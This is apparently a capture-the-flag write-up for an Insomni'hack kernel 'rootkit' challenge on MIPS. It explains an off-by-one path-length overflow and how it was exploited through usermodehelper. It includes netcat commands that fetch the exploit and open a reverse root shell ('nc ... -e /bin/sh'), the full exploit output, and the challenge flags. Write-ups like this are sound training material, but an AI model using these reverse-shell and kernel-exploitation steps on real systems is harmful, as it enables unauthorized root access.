## Infos

**Author**: awe
**Category**: Pwn
**Difficulty**: Hard

## Description:

  Our router seems to have a weird kernel module installed... Abuse it to get root!

  Connect to it with:
  ```bash
  ssh rootkit@rootkit.insomni.hack
  Password: flag of the "microwave" task
  ```

## Solution:

The target is a very simple rootkit running on a MIPS system. It creates a `/dev/rootkit` device, which can be used to hide files on the filesystem by hooking functions used to list directories. Example interaction:
  ```bash
  echo +/home > /dev/rootkit   # Hide /home and all subdirectories
  cat /dev/rootkit             # Show hidden paths in dmesg
  ls /                         # No /home anymore
  echo -/home > /dev/rootkit   # Unhide /home
  ```

  The `resolve_path` function constructs the fullpath from a `dentry` struct, which is later used to compare against the list of hidden paths. It checks that the length of the current directory/filename is not more than the number of bytes available in the destination buffer, but actually recurses without taking the `"/"` character it inserts to join directory/file names into account. It results in a buffer overflow, where each new resolved subdirectory allows to increase the overflow size by one byte. It takes around 48 nested directories to get control over PC.

  Exploiting kernel stack buffer overflows is straight-forward however cleaning the stack in MIPS can be a pain... A nice trick here is to use the `usermodehelper` (http://www.ibm.com/developerworks/library/l-user-space-apps/) to spawn a userland connect-back shell, which is a easy CTF-style workaround. It's very dirty though, kernel will crash once that shell is closed since there was no cleanup ;)

### Exploit:

**Connect with :**

```bash
ssh rootkit@rootkit.insomni.hack
Pass: INS{L3ts g3t th1s party start3d}
```

**Send the exploit to the VM:**

  LOCAL:
  ```bash
nc -lvp 1338 < ./exploit
```

  REMOTE:
```bash
cd /home/pwner/ && nc <connect_back_ip> 1338 > exploit && chmod +x ./exploit
```

**Exploit:**

  LOCAL:
```bash
nc -lvp 1337
```

  REMOTE:
```bash
./exploit 'nc <connect_back_ip> 1337 -e /bin/sh'
```

**Profit!:**

  LOCAL:
```bash
cat /root/flag
```

## Exploit output:

```bash
Linux version 4.5.0 (root@gentoo) (gcc version 4.9.1 (crosstool-NG 1.20.0) ) #3 SMP Mon Mar 14 15:19:58 CET 2016
earlycon: Early serial console at I/O port 0x3f8 (options '38400n8')
bootconsole [uart0] enabled
CPU0 revision is: 00019300 (MIPS 24Kc)
FPU revision is: 00739300
MIPS: machine is mti,malta
Software DMA cache coherency enabled
Determined physical RAM map:
 memory: 03ffc000 @ 00000000 (usable)
kernel.dmesg_restrict = 1
route: SIOCDELRT: No such process
/ $ cd /home/pwner/
~ $ nc 192.168.2.22 1338 > exploit
~ $ chmod +x exploit
~ $ ./exploit 'nc 192.168.2.22 1337 -e /bin/sh'
[+] Resolving kernel addresses...
 [+] Resolved commit_creds to 0x80147ae0
 [+] Resolved prepare_kernel_cred to 0x80147e54
 [+] Resolved call_usermodehelper_setup to 0x8013c054
 [+] Resolved call_usermodehelper_exec to 0x8013c51c
[+] mmap the payload...
[+] Writting jump shellcode @ 0x61627364
[+] Create directories...
[+] Hide /home...
[+] Trigger stack buffer overflow ...
CPU 0 Unable to handle kernel paging request at virtual address 63642f60, epc == 63642f61, ra == 8013c484
Oops[#1]:
CPU: 0 PID: 934 Comm: kworker/u2:2 Tainted: G           O    4.5.0 #3
task: 820aa5d8 ti: 82d94000 task.ti: 82d94000
$ 0   : 00000000 00000001 63642f61 00000000
$ 4   : 82bc0f00 82bc0a00 0000003f ffffffff
$ 8   : 0000003f ffffffff 8069ef48 87ef0740
$12   : 00000000 00000000 00000000 00000000
$16   : 82bc0a00 82bc0f00 8071a41c 80698900
$20   : 82a88e1c 00000001 00000000 82a88cc0
$24   : 00000000 801578e8
$28   : 82d94000 82d97f00 82a88e80 8013c484
Hi    : 00fa83b2
Lo    : 7d71e1f9
epc   : 63642f61 0x63642f61
ra    : 8013c484 call_usermodehelper_exec_async+0xfc/0x194
Status: 1000a703	KERNEL EXL IE
Cause : 10800008 (ExcCode 02)
BadVA : 63642f60
PrId  : 00019300 (MIPS 24Kc)
Modules linked in: rootkit(O)
Process kworker/u2:2 (pid: 934, threadinfo=82d94000, task=820aa5d8, tls=00000000)
Stack : 8013c388 82bc0f00 823252d8 8014f898 00000000 00000000 8013c388 82bc0f00
	  823252d8 801061d8 00000000 00000000 00000000 00000000 00000000 00000000
	  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
	  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
	  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
	  ...
Call Trace:
[<8013c388>] call_usermodehelper_exec_async+0x0/0x194
[<8014f898>] schedule_tail+0x10/0x70
[<8013c388>] call_usermodehelper_exec_async+0x0/0x194
[<801061d8>] ret_from_kernel_thread+0x14/0x1c


Code: (Bad address in epc)

---[ end trace 5004159a0a669eab ]---
Fatal exception: panic in 5 secondsqemu-system-mips: terminating on signal 2
```

Meanwhile:
```bash
gentoo src # nc -lvp 1338 < exploit
listening on [any] 1338 ...
192.168.2.22: inverse host lookup failed:
connect to [192.168.2.22] from (UNKNOWN) [192.168.2.22] 37612
^C
gentoo src # nc -lvp 1337
listening on [any] 1337 ...
192.168.2.22: inverse host lookup failed:
connect to [192.168.2.22] from (UNKNOWN) [192.168.2.22] 42926
id
uid=0(root) gid=0(root)
cat /root/flag
INS{grsec's RBAC would be a much better rootkit!}
```

The kernel panic happens when the connect-back is closed.
